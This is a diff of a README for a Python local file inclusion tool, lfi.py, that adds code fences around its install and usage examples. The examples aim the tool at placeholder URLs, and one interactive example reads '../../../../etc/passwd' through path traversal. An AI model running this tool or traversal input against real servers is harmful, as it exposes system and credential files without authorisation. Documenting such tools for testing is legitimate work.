@@ -13,19 +13,19 @@ LFI endpoint.
 -   requests
 
 Install dependencies:
-
+```bash
 pip install -r requirements.txt
-
+```
 ------------------------------------------------------------------------
 
 ## Usage
-
+```python
 python3 lfi.py 'http://site.com/index.php?file='
-
+```
 Example:
-
+```python
 python3 lfi.py 'http://target.com/page.php?file=' -v
-
+```
 ------------------------------------------------------------------------
 
 ## Options
@@ -37,21 +37,21 @@ Show extra connection/debug details.
 Save fetched file contents into a local file.
 
 Example with output saving:
-
+```python
 python3 lfi.py 'http://target.com/page.php?file=' -o output.txt
-
+```
 ------------------------------------------------------------------------
 
 ## Interactive Shell
 
 After starting the tool, you'll enter interactive mode:
-
+```
 shell \>\>\>
-
+```
 Type the filename you want to fetch:
-
+```
 shell \>\>\> ../../../../etc/passwd
-
+```
 Type `exit` or `quit` to close the tool.
 
 ------------------------------------------------------------------------
